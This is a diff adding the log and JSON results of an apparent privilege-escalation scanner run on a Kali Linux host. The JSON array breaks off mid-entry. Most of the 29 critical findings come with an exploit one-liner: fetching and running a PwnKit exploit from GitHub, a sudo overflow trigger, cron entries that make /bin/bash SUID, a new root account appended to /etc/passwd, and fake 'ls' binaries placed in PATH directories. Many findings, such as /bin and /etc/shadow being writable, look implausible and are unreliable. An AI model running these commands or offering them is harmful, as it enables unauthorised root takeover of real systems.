@@ -1,0 +1,593 @@
+[0;36m============================================================[0m
+[0;36mContextPrivesc v1.0 - Normal Scan[0m
+[0;36mTarget: Hasib[0m
+[0;36mMode: normal - Comprehensive scan (2-5 min)[0m
+[0;36mOutput: /home/kali/contextprivesc/results/scan_20260426_223307[0m
+[0;36m============================================================[0m
+[0;36mAnalyzing system information[0m
+[0;36m[INFO] OS: Kali GNU/Linux Rolling[0m
+[0;35m[MITRE] T1082 - System Information Discovery[0m
+{"id": 1, "severity": "INFO", "category": "System", "title": "OS: Kali GNU/Linux Rolling", "detail": "System running Kali GNU/Linux Rolling", "mitre_id": "T1082", "exploit": "", "cve": "", "timestamp": "2026-04-26T22:33:07.307166", "mitre_name": "System Information Discovery", "mitre_tactic": "Discovery"}
+[0;36m[INFO] Kernel: 6.19.11+kali-amd64[0m
+[0;35m[MITRE] T1082 - System Information Discovery[0m
+{"id": 2, "severity": "INFO", "category": "System", "title": "Kernel: 6.19.11+kali-amd64", "detail": "Kernel version 6.19.11+kali-amd64", "mitre_id": "T1082", "exploit": "", "cve": "", "timestamp": "2026-04-26T22:33:07.307266", "mitre_name": "System Information Discovery", "mitre_tactic": "Discovery"}
+[0;36mCPU: Intel(R) Core(TM) i5-8350U CPU @ 1.70GHz[0m
+[0;36mMemory:
+total        used        free      shared  buff/cache   available
+Mem:           3.8Gi       1.2Gi       569Mi        32Mi       2.3Gi       2.6Gi
+Swap:          953Mi        38Mi       914Mi[0m
+[0;36mDisk:
+Filesystem      Size  Used Avail Use% Mounted on
+udev            1.8G     0  1.8G   0% /dev
+tmpfs           389M  1.2M  387M   1% /run
+/dev/sda1        79G   17G   58G  23% /
+tmpfs           1.9G  4.0K  1.9G   1% /dev/shm
+none            1.0M     0  1.0M   0% /run/credentials/systemd-journald.service
+tmpfs           1.9G  5.2M  1.9G   1% /tmp
+none            1.0M     0  1.0M   0% /run/credentials/getty@tty1.service
+tmpfs           389M  120K  389M   1% /run/user/1000[0m
+[1;33m[WARNING] /tmp is world-writable[0m
+[0;35m[MITRE] T1036 - Masquerading[0m
+{"id": 3, "severity": "WARNING", "category": "Permissions", "title": "/tmp is world-writable", "detail": "Temp directory writable by all users", "mitre_id": "T1036", "exploit": "", "cve": "", "timestamp": "2026-04-26T22:33:07.311555", "mitre_name": "Masquerading", "mitre_tactic": "Defense Evasion"}
+[0;36mChecking kernel vulnerabilities[0m
+[1;33m[WARNING] PwnKit (CVE-2021-4034)[0m
+[0;35m[MITRE] T1068 - Exploitation for Privilege Escalation[0m
+{"id": 4, "severity": "WARNING", "category": "Kernel", "title": "PwnKit (CVE-2021-4034)", "detail": "pkexec present - Polkit vulnerability", "mitre_id": "T1068", "exploit": "git clone https://github.com/berdav/CVE-2021-4034 && cd CVE-2021-4034 && make && ./cve-2021-4034", "cve": "CVE-2021-4034", "timestamp": "2026-04-26T22:33:07.312078", "mitre_name": "Exploitation for Privilege Escalation", "mitre_tactic": "Privilege Escalation"}
+[0;36mAnalyzing sudo privileges[0m
+[1;31m[CRITICAL] Baron Samedit (CVE-2021-3156)[0m
+[38;5;208m[EXPLOIT] sudoedit -s / '$(python3 -c "print(\"A\"*65536)")'[0m
+[0;35m[MITRE] T1068 - Exploitation for Privilege Escalation[0m
+{"id": 5, "severity": "CRITICAL", "category": "Sudo", "title": "Baron Samedit (CVE-2021-3156)", "detail": "Sudo version vulnerable to heap overflow", "mitre_id": "T1068", "exploit": "sudoedit -s / '$(python3 -c \"print(\\\"A\\\"*65536)\")'", "cve": "CVE-2021-3156", "timestamp": "2026-04-26T22:33:07.323526", "mitre_name": "Exploitation for Privilege Escalation", "mitre_tactic": "Privilege Escalation"}
+[0;36mScanning SUID binaries[0m
+[0;36mFound 34 SUID binaries[0m
+[0;36mAnalyzing cron jobs[0m
+[1;31m[CRITICAL] Writable Cron File: john[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/john[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 6, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: john", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/john", "cve": "", "timestamp": "2026-04-26T22:33:09.600773", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable Cron File: .placeholder[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/.placeholder[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 7, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: .placeholder", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/.placeholder", "cve": "", "timestamp": "2026-04-26T22:33:09.600912", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable Cron File: e2scrub_all[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/e2scrub_all[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 8, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: e2scrub_all", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/e2scrub_all", "cve": "", "timestamp": "2026-04-26T22:33:09.601024", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable Cron File: sysstat[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/sysstat[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 9, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: sysstat", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/sysstat", "cve": "", "timestamp": "2026-04-26T22:33:09.601129", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable Cron File: php[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/php[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 10, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: php", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/php", "cve": "", "timestamp": "2026-04-26T22:33:09.601232", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable Cron File: .placeholder[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/.placeholder[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 11, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: .placeholder", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/.placeholder", "cve": "", "timestamp": "2026-04-26T22:33:09.601372", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable Cron File: dpkg[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/dpkg[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 12, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: dpkg", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/dpkg", "cve": "", "timestamp": "2026-04-26T22:33:09.601489", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable Cron File: sysstat[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/sysstat[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 13, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: sysstat", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/sysstat", "cve": "", "timestamp": "2026-04-26T22:33:09.601592", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable Cron File: man-db[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/man-db[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 14, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: man-db", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/man-db", "cve": "", "timestamp": "2026-04-26T22:33:09.601693", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable Cron File: apache2[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/apache2[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 15, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: apache2", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/apache2", "cve": "", "timestamp": "2026-04-26T22:33:09.601897", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable Cron File: plocate[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/plocate[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 16, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: plocate", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/plocate", "cve": "", "timestamp": "2026-04-26T22:33:09.602018", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable Cron File: logrotate[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/logrotate[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 17, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: logrotate", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/logrotate", "cve": "", "timestamp": "2026-04-26T22:33:09.602121", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable Cron File: apt-compat[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/apt-compat[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 18, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: apt-compat", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/apt-compat", "cve": "", "timestamp": "2026-04-26T22:33:09.602223", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable Cron File: .placeholder[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.hourly/.placeholder[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 19, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: .placeholder", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.hourly/.placeholder", "cve": "", "timestamp": "2026-04-26T22:33:09.602408", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable Cron File: .placeholder[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.weekly/.placeholder[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 20, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: .placeholder", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.weekly/.placeholder", "cve": "", "timestamp": "2026-04-26T22:33:09.602565", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable Cron File: man-db[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.weekly/man-db[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 21, "severity": "CRITICAL", "category": "Cron", "title": "Writable Cron File: man-db", "detail": "Cron file is world-writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.weekly/man-db", "cve": "", "timestamp": "2026-04-26T22:33:09.602670", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[1;31m[CRITICAL] Writable System Crontab[0m
+[38;5;208m[EXPLOIT] echo '* * * * * root chmod 4777 /bin/bash' >> /etc/crontab[0m
+[0;35m[MITRE] T1053.003 - Cron[0m
+{"id": 22, "severity": "CRITICAL", "category": "Cron", "title": "Writable System Crontab", "detail": "/etc/crontab is writable", "mitre_id": "T1053.003", "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/crontab", "cve": "", "timestamp": "2026-04-26T22:33:09.602775", "mitre_name": "Cron", "mitre_tactic": "Execution"}
+[0;36mChecking sensitive file permissions[0m
+[1;31m[CRITICAL] Shadow File Readable[0m
+[38;5;208m[EXPLOIT] hashcat -m 1800 shadow.txt rockyou.txt[0m
+[0;35m[MITRE] T1005 - Data from Local System[0m
+{"id": 23, "severity": "CRITICAL", "category": "Files", "title": "Shadow File Readable", "detail": "Password hashes exposed", "mitre_id": "T1005", "exploit": "hashcat -m 1800 shadow.txt rockyou.txt", "cve": "", "timestamp": "2026-04-26T22:33:09.602894", "mitre_name": "Data from Local System", "mitre_tactic": "Collection"}
+[1;31m[CRITICAL] Writable: /etc/shadow[0m
+[0;35m[MITRE] T1222 - File Permissions Modification[0m
+{"id": 24, "severity": "CRITICAL", "category": "Files", "title": "Writable: /etc/shadow", "detail": "System file /etc/shadow is writable", "mitre_id": "T1222", "exploit": "", "cve": "", "timestamp": "2026-04-26T22:33:09.602985", "mitre_name": "File Permissions Modification", "mitre_tactic": "Defense Evasion"}
+[1;31m[CRITICAL] Passwd File Writable[0m
+[38;5;208m[EXPLOIT] echo 'hacker:$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> /etc/passwd[0m
+[0;35m[MITRE] T1005 - Data from Local System[0m
+{"id": 25, "severity": "CRITICAL", "category": "Files", "title": "Passwd File Writable", "detail": "Can add root user", "mitre_id": "T1005", "exploit": "echo 'hacker:$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> /etc/passwd", "cve": "", "timestamp": "2026-04-26T22:33:09.603054", "mitre_name": "Data from Local System", "mitre_tactic": "Collection"}
+[1;31m[CRITICAL] Writable: /etc/passwd[0m
+[0;35m[MITRE] T1222 - File Permissions Modification[0m
+{"id": 26, "severity": "CRITICAL", "category": "Files", "title": "Writable: /etc/passwd", "detail": "System file /etc/passwd is writable", "mitre_id": "T1222", "exploit": "", "cve": "", "timestamp": "2026-04-26T22:33:09.603150", "mitre_name": "File Permissions Modification", "mitre_tactic": "Defense Evasion"}
+[1;31m[CRITICAL] /root Directory Readable[0m
+[0;35m[MITRE] T1083 - File Discovery[0m
+{"id": 27, "severity": "CRITICAL", "category": "Files", "title": "/root Directory Readable", "detail": "Root home directory accessible", "mitre_id": "T1083", "exploit": "", "cve": "", "timestamp": "2026-04-26T22:33:09.603235", "mitre_name": "File Discovery", "mitre_tactic": "Discovery"}
+[0;36mChecking container escape vectors[0m
+[0;36mChecking PATH hijacking[0m
+[1;31m[CRITICAL] Writable PATH Directory: /usr/local/sbin[0m
+[38;5;208m[EXPLOIT] echo '#!/bin/bash\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /usr/local/sbin/ls && chmod +x /usr/local/sbin/ls[0m
+[0;35m[MITRE] T1574.007 - Path Interception[0m
+{"id": 28, "severity": "CRITICAL", "category": "Path", "title": "Writable PATH Directory: /usr/local/sbin", "detail": "Directory in PATH is writable", "mitre_id": "T1574.007", "exploit": "echo '#!/bin/bash\\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /usr/local/sbin/ls && chmod +x /usr/local/sbin/ls", "cve": "", "timestamp": "2026-04-26T22:33:09.604690", "mitre_name": "Path Interception", "mitre_tactic": "Privilege Escalation"}
+[1;31m[CRITICAL] Writable PATH Directory: /usr/local/bin[0m
+[38;5;208m[EXPLOIT] echo '#!/bin/bash\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /usr/local/bin/ls && chmod +x /usr/local/bin/ls[0m
+[0;35m[MITRE] T1574.007 - Path Interception[0m
+{"id": 29, "severity": "CRITICAL", "category": "Path", "title": "Writable PATH Directory: /usr/local/bin", "detail": "Directory in PATH is writable", "mitre_id": "T1574.007", "exploit": "echo '#!/bin/bash\\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /usr/local/bin/ls && chmod +x /usr/local/bin/ls", "cve": "", "timestamp": "2026-04-26T22:33:09.604905", "mitre_name": "Path Interception", "mitre_tactic": "Privilege Escalation"}
+[1;31m[CRITICAL] Writable PATH Directory: /usr/sbin[0m
+[38;5;208m[EXPLOIT] echo '#!/bin/bash\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /usr/sbin/ls && chmod +x /usr/sbin/ls[0m
+[0;35m[MITRE] T1574.007 - Path Interception[0m
+{"id": 30, "severity": "CRITICAL", "category": "Path", "title": "Writable PATH Directory: /usr/sbin", "detail": "Directory in PATH is writable", "mitre_id": "T1574.007", "exploit": "echo '#!/bin/bash\\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /usr/sbin/ls && chmod +x /usr/sbin/ls", "cve": "", "timestamp": "2026-04-26T22:33:09.605084", "mitre_name": "Path Interception", "mitre_tactic": "Privilege Escalation"}
+[1;31m[CRITICAL] Writable PATH Directory: /usr/bin[0m
+[38;5;208m[EXPLOIT] echo '#!/bin/bash\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /usr/bin/ls && chmod +x /usr/bin/ls[0m
+[0;35m[MITRE] T1574.007 - Path Interception[0m
+{"id": 31, "severity": "CRITICAL", "category": "Path", "title": "Writable PATH Directory: /usr/bin", "detail": "Directory in PATH is writable", "mitre_id": "T1574.007", "exploit": "echo '#!/bin/bash\\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /usr/bin/ls && chmod +x /usr/bin/ls", "cve": "", "timestamp": "2026-04-26T22:33:09.605304", "mitre_name": "Path Interception", "mitre_tactic": "Privilege Escalation"}
+[1;31m[CRITICAL] Writable PATH Directory: /sbin[0m
+[38;5;208m[EXPLOIT] echo '#!/bin/bash\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /sbin/ls && chmod +x /sbin/ls[0m
+[0;35m[MITRE] T1574.007 - Path Interception[0m
+{"id": 32, "severity": "CRITICAL", "category": "Path", "title": "Writable PATH Directory: /sbin", "detail": "Directory in PATH is writable", "mitre_id": "T1574.007", "exploit": "echo '#!/bin/bash\\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /sbin/ls && chmod +x /sbin/ls", "cve": "", "timestamp": "2026-04-26T22:33:09.605476", "mitre_name": "Path Interception", "mitre_tactic": "Privilege Escalation"}
+[1;31m[CRITICAL] Writable PATH Directory: /bin[0m
+[38;5;208m[EXPLOIT] echo '#!/bin/bash\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /bin/ls && chmod +x /bin/ls[0m
+[0;35m[MITRE] T1574.007 - Path Interception[0m
+{"id": 33, "severity": "CRITICAL", "category": "Path", "title": "Writable PATH Directory: /bin", "detail": "Directory in PATH is writable", "mitre_id": "T1574.007", "exploit": "echo '#!/bin/bash\\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > /bin/ls && chmod +x /bin/ls", "cve": "", "timestamp": "2026-04-26T22:33:09.605602", "mitre_name": "Path Interception", "mitre_tactic": "Privilege Escalation"}
+[0;36mAnalyzing network services[0m
+[0;36mListening ports: 0[0m
+[0;36m============================================================[0m
+[0;36mSCAN COMPLETE[0m
+[0;36mCritical: 29 | Warning: 2 | Info: 2[0m
+[0;36mResults: /home/kali/contextprivesc/results/scan_20260426_223307[0m
+[0;36m============================================================[0m
+[
+  {
+    "id": 1,
+    "severity": "INFO",
+    "category": "System",
+    "title": "OS: Kali GNU/Linux Rolling",
+    "detail": "System running Kali GNU/Linux Rolling",
+    "mitre_id": "T1082",
+    "exploit": "",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:07.307166",
+    "mitre_name": "System Information Discovery",
+    "mitre_tactic": "Discovery"
+  },
+  {
+    "id": 2,
+    "severity": "INFO",
+    "category": "System",
+    "title": "Kernel: 6.19.11+kali-amd64",
+    "detail": "Kernel version 6.19.11+kali-amd64",
+    "mitre_id": "T1082",
+    "exploit": "",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:07.307266",
+    "mitre_name": "System Information Discovery",
+    "mitre_tactic": "Discovery"
+  },
+  {
+    "id": 3,
+    "severity": "WARNING",
+    "category": "Permissions",
+    "title": "/tmp is world-writable",
+    "detail": "Temp directory writable by all users",
+    "mitre_id": "T1036",
+    "exploit": "",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:07.311555",
+    "mitre_name": "Masquerading",
+    "mitre_tactic": "Defense Evasion"
+  },
+  {
+    "id": 4,
+    "severity": "WARNING",
+    "category": "Kernel",
+    "title": "PwnKit (CVE-2021-4034)",
+    "detail": "pkexec present - Polkit vulnerability",
+    "mitre_id": "T1068",
+    "exploit": "git clone https://github.com/berdav/CVE-2021-4034 && cd CVE-2021-4034 && make && ./cve-2021-4034",
+    "cve": "CVE-2021-4034",
+    "timestamp": "2026-04-26T22:33:07.312078",
+    "mitre_name": "Exploitation for Privilege Escalation",
+    "mitre_tactic": "Privilege Escalation"
+  },
+  {
+    "id": 5,
+    "severity": "CRITICAL",
+    "category": "Sudo",
+    "title": "Baron Samedit (CVE-2021-3156)",
+    "detail": "Sudo version vulnerable to heap overflow",
+    "mitre_id": "T1068",
+    "exploit": "sudoedit -s / '$(python3 -c \"print(\\\"A\\\"*65536)\")'",
+    "cve": "CVE-2021-3156",
+    "timestamp": "2026-04-26T22:33:07.323526",
+    "mitre_name": "Exploitation for Privilege Escalation",
+    "mitre_tactic": "Privilege Escalation"
+  },
+  {
+    "id": 6,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: john",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/john",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.600773",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 7,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: .placeholder",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/.placeholder",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.600912",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 8,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: e2scrub_all",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/e2scrub_all",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.601024",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 9,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: sysstat",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/sysstat",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.601129",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 10,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: php",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.d/php",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.601232",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 11,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: .placeholder",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/.placeholder",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.601372",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 12,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: dpkg",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/dpkg",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.601489",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 13,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: sysstat",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/sysstat",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.601592",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 14,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: man-db",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/man-db",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.601693",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 15,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: apache2",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/apache2",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.601897",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 16,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: plocate",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/plocate",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.602018",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 17,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: logrotate",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/logrotate",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.602121",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 18,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: apt-compat",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.daily/apt-compat",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.602223",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 19,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: .placeholder",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.hourly/.placeholder",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.602408",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 20,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: .placeholder",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.weekly/.placeholder",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.602565",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 21,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable Cron File: man-db",
+    "detail": "Cron file is world-writable",
+    "mitre_id": "T1053.003",
+    "exploit": "echo '* * * * * root chmod 4777 /bin/bash' >> /etc/cron.weekly/man-db",
+    "cve": "",
+    "timestamp": "2026-04-26T22:33:09.602670",
+    "mitre_name": "Cron",
+    "mitre_tactic": "Execution"
+  },
+  {
+    "id": 22,
+    "severity": "CRITICAL",
+    "category": "Cron",
+    "title": "Writable System Crontab",
+    "detail": "/etc/crontab is writable",
+    "mitre_id": "T1053.003",
